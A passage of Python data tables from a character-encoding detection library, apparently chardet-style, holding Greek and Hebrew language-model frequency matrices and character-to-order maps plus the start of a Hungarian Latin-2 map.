0,3,3,3,3,3,3,0,3,0,2,0,3,2,0,3,2,3,2,3,0,0,3,2,3,2,3,3,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,3,0,0,2,3,3,3,3,3,0,0,0,3,0,2,1,0,0,3,2,2,2,0,3,0,0,2,2,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,0,3,3,3,2,0,3,0,3,0,3,3,0,2,1,2,3,3,0,0,3,0,3,0,3,3,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,2,3,3,3,0,3,3,3,3,3,3,0,2,3,0,3,0,0,0,2,1,0,2,2,3,0,0,2,2,2,0,
0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,3,0,0,2,3,3,3,2,3,0,0,1,3,0,2,0,0,0,0,3,0,1,0,2,0,0,1,1,1,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,3,1,0,3,0,0,0,3,2,0,3,2,3,3,3,0,0,3,0,3,2,2,2,1,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,0,3,3,3,0,0,3,0,0,0,0,2,0,2,3,3,2,2,2,2,3,0,2,0,2,2,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,3,3,3,2,0,0,0,0,0,0,2,3,0,2,0,2,3,2,0,0,3,0,3,0,3,1,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,3,2,3,3,2,2,3,0,2,0,3,0,0,0,2,0,0,0,0,1,2,0,2,0,2,0,
0,2,0,2,0,2,2,0,0,1,0,2,2,2,0,2,2,2,0,2,2,2,0,0,2,0,0,1,0,0,0,0,
0,2,0,3,3,2,0,0,0,0,0,0,1,3,0,2,0,2,2,2,0,0,2,0,3,0,0,2,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,0,2,3,2,0,2,2,0,2,0,2,2,0,2,0,2,2,2,0,0,0,0,0,0,2,3,0,0,0,2,
0,1,2,0,0,0,0,2,2,0,0,0,2,1,0,2,2,0,0,0,0,0,0,1,0,2,0,0,0,0,0,0,
0,0,2,1,0,2,3,2,2,3,2,3,2,0,0,3,3,3,0,0,3,2,0,0,0,1,1,0,2,0,2,2,
0,2,0,2,0,2,2,0,0,2,0,2,2,2,0,2,2,2,2,0,0,2,0,0,0,2,0,1,0,0,0,0,
0,3,0,3,3,2,2,0,3,0,0,0,2,2,0,2,2,2,1,2,0,0,1,2,2,0,0,3,0,0,0,2,
0,1,2,0,0,0,1,2,0,0,0,0,0,0,0,2,2,0,1,0,0,2,0,0,0,2,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,2,3,3,2,2,0,0,0,2,0,2,3,3,0,2,0,0,0,0,0,0,2,2,2,0,2,2,0,2,0,2,
0,2,2,0,0,2,2,2,2,1,0,0,2,2,0,2,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,0,
0,2,0,3,2,3,0,0,0,3,0,0,2,2,0,2,0,2,2,2,0,0,2,0,0,0,0,0,0,0,0,2,
0,0,2,2,0,0,2,2,2,0,0,0,0,0,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,2,0,0,3,2,0,2,2,2,2,2,0,0,0,2,0,0,0,0,2,0,1,0,0,2,0,1,0,0,0,
0,2,2,2,0,2,2,0,1,2,0,2,2,2,0,2,2,2,2,1,2,2,0,0,2,0,0,0,0,0,0,0,
0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
0,2,0,2,0,2,2,0,0,0,0,1,2,1,0,0,2,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,3,2,3,0,0,2,0,0,0,2,2,0,2,0,0,0,1,0,0,2,0,2,0,2,2,0,0,0,0,
0,0,2,0,0,0,0,2,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,
0,2,2,3,2,2,0,0,0,0,0,0,1,3,0,2,0,2,2,0,0,0,1,0,2,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,2,0,2,0,3,2,0,2,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
0,0,2,0,0,0,0,1,1,0,0,2,1,2,0,2,2,0,1,0,0,1,0,0,0,2,0,0,0,0,0,0,
0,3,0,2,2,2,0,0,2,0,0,0,2,0,0,0,2,3,0,2,0,0,0,0,0,0,2,2,0,0,0,2,
0,1,2,0,0,0,1,2,2,1,0,0,0,2,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,2,1,2,0,2,2,0,2,0,0,2,0,0,0,0,1,2,1,0,2,1,0,0,0,0,0,0,0,0,0,0,
0,0,2,0,0,0,3,1,2,2,0,2,0,0,0,0,2,0,0,0,2,0,0,3,0,0,0,0,2,2,2,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,2,1,0,2,0,1,2,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,0,0,2,
0,2,2,0,0,2,2,2,2,2,0,1,2,0,0,0,2,2,0,1,0,2,0,0,2,2,0,0,0,0,0,0,
0,0,0,0,1,0,0,0,0,0,0,0,3,0,0,2,0,0,0,0,0,0,0,0,2,0,2,0,0,0,0,2,
0,1,2,0,0,0,0,2,2,1,0,1,0,1,0,2,2,2,1,0,0,0,0,0,0,1,0,0,0,0,0,0,
0,2,0,1,2,0,0,0,0,0,0,0,0,0,0,2,0,0,2,2,0,0,0,0,1,0,0,0,0,0,0,2,
0,2,2,0,0,0,0,2,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,
0,2,2,2,2,0,0,0,3,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,0,1,
0,0,2,0,0,0,0,1,2,0,0,0,0,0,0,2,2,1,1,0,0,0,0,0,0,1,0,0,0,0,0,0,
0,2,0,2,2,2,0,0,2,0,0,0,0,0,0,0,2,2,2,0,0,0,2,0,0,0,0,0,0,0,0,2,
0,0,1,0,0,0,0,2,1,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,
0,3,0,2,0,0,0,0,0,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,2,0,0,0,0,2,
0,0,2,0,0,0,0,2,2,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,2,0,2,2,1,0,0,0,0,0,0,2,0,0,2,0,2,2,2,0,0,0,0,0,0,2,0,0,0,0,2,
0,0,2,0,0,2,0,2,2,0,0,0,0,2,0,2,0,0,0,0,0,2,0,0,0,2,0,0,0,0,0,0,
0,0,3,0,0,0,2,2,0,2,2,0,0,0,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,
0,2,2,2,2,2,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,
0,0,0,0,0,0,0,2,1,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,2,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
0,2,0,0,0,2,0,0,0,0,0,1,0,0,0,0,2,2,0,0,0,1,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,2,0,0,0,
0,2,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,2,0,2,0,0,0,
0,0,0,0,0,0,0,0,2,1,0,0,0,0,0,0,2,0,0,0,1,2,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
)
Latin7GreekModel = {
'charToOrderMap': Latin7_CharToOrderMap,
'precedenceMatrix': GreekLangModel,
'mTypicalPositiveRatio': 0.982851,
'keepEnglishLetter': False,
'charsetName': "ISO-8859-7"
}
Win1253GreekModel = {
'charToOrderMap': win1253_CharToOrderMap,
'precedenceMatrix': GreekLangModel,
'mTypicalPositiveRatio': 0.982851,
'keepEnglishLetter': False,
'charsetName': "windows-1253"
}
from . import constants
win1255_CharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253, 69, 91, 79, 80, 92, 89, 97, 90, 68,111,112, 82, 73, 95, 85,
78,121, 86, 71, 67,102,107, 84,114,103,115,253,253,253,253,253,
253, 50, 74, 60, 61, 42, 76, 70, 64, 53,105, 93, 56, 65, 54, 49,
66,110, 51, 43, 44, 63, 81, 77, 98, 75,108,253,253,253,253,253,
124,202,203,204,205, 40, 58,206,207,208,209,210,211,212,213,214,
215, 83, 52, 47, 46, 72, 32, 94,216,113,217,109,218,219,220,221,
34,116,222,118,100,223,224,117,119,104,125,225,226, 87, 99,227,
106,122,123,228, 55,229,230,101,231,232,120,233, 48, 39, 57,234,
30, 59, 41, 88, 33, 37, 36, 31, 29, 35,235, 62, 28,236,126,237,
238, 38, 45,239,240,241,242,243,127,244,245,246,247,248,249,250,
9,  8, 20, 16,  3,  2, 24, 14, 22,  1, 25, 15,  4, 11,  6, 23,
12, 19, 13, 26, 18, 27, 21, 17,  7, 10,  5,251,252,128, 96,253,
)
HebrewLangModel = (
0,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,2,3,2,1,2,0,1,0,0,
3,0,3,1,0,0,1,3,2,0,1,1,2,0,2,2,2,1,1,1,1,2,1,1,1,2,0,0,2,2,0,1,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,
1,2,1,2,1,2,0,0,2,0,0,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,
1,2,1,3,1,1,0,0,2,0,0,0,1,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,0,1,2,2,1,3,
1,2,1,1,2,2,0,0,2,2,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,1,0,1,1,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,2,2,2,2,3,2,
1,2,1,2,2,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,2,3,2,2,3,2,2,2,1,2,2,2,2,
1,2,1,1,2,2,0,1,2,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,0,2,2,2,2,2,
0,2,0,2,2,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,0,2,2,2,
0,2,1,2,2,2,0,0,2,1,0,0,0,0,1,0,1,0,0,0,0,0,0,2,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,2,1,2,3,2,2,2,
1,2,1,2,2,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,1,0,
3,3,3,3,3,3,3,3,3,2,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,1,0,2,0,2,
0,2,1,2,2,2,0,0,1,2,0,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,2,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,2,3,2,2,3,2,1,2,1,1,1,
0,1,1,1,1,1,3,0,1,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,1,1,0,0,1,0,0,1,0,0,0,0,
0,0,1,0,0,0,0,0,2,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,2,2,2,
0,2,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,2,3,3,3,2,1,2,3,3,2,3,3,3,3,2,3,2,1,2,0,2,1,2,
0,2,0,2,2,2,0,0,1,2,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,
3,3,3,3,3,3,3,3,3,2,3,3,3,1,2,2,3,3,2,3,2,3,2,2,3,1,2,2,0,2,2,2,
0,2,1,2,2,2,0,0,1,2,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,1,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,2,3,3,2,2,2,3,3,3,3,1,3,2,2,2,
0,2,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,3,3,3,2,3,2,2,2,1,2,2,0,2,2,2,2,
0,2,0,2,2,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,1,3,2,3,3,2,3,3,2,2,1,2,2,2,2,2,2,
0,2,1,2,1,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,2,3,2,3,3,2,3,3,3,3,2,3,2,3,3,3,3,3,2,2,2,2,2,2,2,1,
0,2,0,1,2,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,3,3,3,2,1,2,3,3,3,3,3,3,3,2,3,2,3,2,1,2,3,0,2,1,2,2,
0,2,1,1,2,1,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,2,0,
3,3,3,3,3,3,3,3,3,2,3,3,3,3,2,1,3,1,2,2,2,1,2,3,3,1,2,1,2,2,2,2,
0,1,1,1,1,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,
3,3,3,3,3,3,3,3,3,3,0,2,3,3,3,1,3,3,3,1,2,2,2,2,1,1,2,2,2,2,2,2,
0,2,0,1,1,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,
3,3,3,3,3,3,2,3,3,3,2,2,3,3,3,2,1,2,3,2,3,2,2,2,2,1,2,1,1,1,2,2,
0,2,1,1,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,1,0,0,0,0,0,
1,0,1,0,0,0,0,0,2,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,3,3,3,2,3,3,2,3,1,2,2,2,2,3,2,3,1,1,2,2,1,2,2,1,1,0,2,2,2,2,
0,1,0,1,2,2,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,
3,0,0,1,1,0,1,0,0,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,0,
0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,1,0,1,0,1,1,0,1,1,0,0,0,1,1,0,1,1,1,0,0,0,0,0,0,1,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,0,0,1,1,0,1,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
3,2,2,1,2,2,2,2,2,2,2,1,2,2,1,2,2,1,1,1,1,1,1,1,1,2,1,1,0,3,3,3,
0,3,0,2,2,2,2,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
2,2,2,3,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,2,2,1,2,2,2,1,1,1,2,0,1,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,2,2,2,2,2,2,2,2,2,2,1,2,2,2,2,2,2,2,2,2,2,2,0,2,2,0,0,0,0,0,0,
0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,3,1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,1,2,1,0,2,1,0,
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,1,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
0,3,1,1,2,2,2,2,2,1,2,2,2,1,1,2,2,2,2,2,2,2,1,2,2,1,0,1,1,1,1,0,
0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,2,1,1,1,1,2,1,1,2,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,0,0,0,0,
0,0,2,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,0,1,0,0,
2,1,1,2,2,2,2,2,2,2,2,2,2,2,1,2,2,2,2,2,1,2,1,2,1,1,1,1,0,0,0,0,
0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,2,1,2,2,2,2,2,2,2,2,2,2,1,2,1,2,1,1,2,1,1,1,2,1,2,1,2,0,1,0,1,
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,3,1,2,2,2,1,2,2,2,2,2,2,2,2,1,2,1,1,1,1,1,1,2,1,2,1,1,0,1,0,1,
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,1,2,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,2,
0,2,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,1,1,1,1,1,1,1,0,1,1,0,1,0,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,2,0,1,1,1,0,1,0,0,0,1,1,0,1,1,0,0,0,0,0,1,1,0,0,
0,1,1,1,2,1,2,2,2,0,2,0,2,0,1,1,2,1,1,1,1,2,1,0,1,1,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,1,0,0,0,0,0,1,0,1,2,2,0,1,0,0,1,1,2,2,1,2,0,2,0,0,0,1,2,0,1,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,2,0,2,1,2,0,2,0,0,1,1,1,1,1,1,0,1,0,0,0,1,0,0,1,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,1,0,0,0,0,0,1,0,2,1,1,0,1,0,0,1,1,1,2,2,0,0,1,0,0,0,1,0,0,1,
1,1,2,1,0,1,1,1,0,1,0,1,1,1,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,2,2,1,
0,2,0,1,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,1,0,0,1,0,1,1,1,1,0,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,1,1,1,1,1,1,1,1,2,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,1,1,1,0,1,1,0,1,0,0,0,1,1,0,1,
2,0,1,0,1,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,1,1,1,0,1,0,0,1,1,2,1,1,2,0,1,0,0,0,1,1,0,1,
1,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,1,1,2,0,1,0,0,0,0,2,1,1,2,0,2,0,0,0,1,1,0,1,
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,2,1,1,0,1,0,0,2,2,1,2,1,1,0,1,0,0,0,1,1,0,1,
2,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,2,2,0,0,0,0,0,1,1,0,1,0,0,1,0,0,0,0,1,0,1,
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,2,2,0,0,0,0,2,1,1,1,0,2,1,1,0,0,0,2,1,0,1,
1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,1,1,2,0,1,0,0,1,1,0,2,1,1,0,1,0,0,0,1,1,0,1,
2,2,1,1,1,0,1,1,0,1,1,0,1,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,2,1,1,0,1,0,0,1,1,0,1,2,1,0,2,0,0,0,1,1,0,1,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,
0,1,0,0,2,0,2,1,1,0,1,0,1,0,0,1,0,0,0,0,1,0,0,0,1,0,0,0,0,0,1,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,1,0,1,1,2,0,1,0,0,1,1,1,0,1,0,0,1,0,0,0,1,0,0,1,
1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,0,0,0,0,0,0,1,0,1,1,0,0,1,0,0,2,1,1,1,1,1,0,1,0,0,0,0,1,0,1,
0,1,1,1,2,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,1,2,1,0,0,0,0,0,1,1,1,1,1,0,1,0,0,0,1,1,0,0,
)
Win1255HebrewModel = {
'charToOrderMap': win1255_CharToOrderMap,
'precedenceMatrix': HebrewLangModel,
'mTypicalPositiveRatio': 0.984004,
'keepEnglishLetter': False,
'charsetName': "windows-1255"
}
from . import constants
Latin2_HungarianCharToOrderMap = (
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,
253, 28, 40, 54, 45, 32, 50, 49, 38, 39, 53, 36, 41, 34, 35, 47,
46, 71, 43, 33, 37, 57, 48, 64, 68, 55, 52,253,253,253,253,253,
253,  2, 18, 26, 17,  1, 27, 12, 20,  9, 22,  7,  6, 13,  4,  8,
23, 67, 10,  5,  3, 21, 19, 65, 62, 16, 11,253,253,253,253,253,
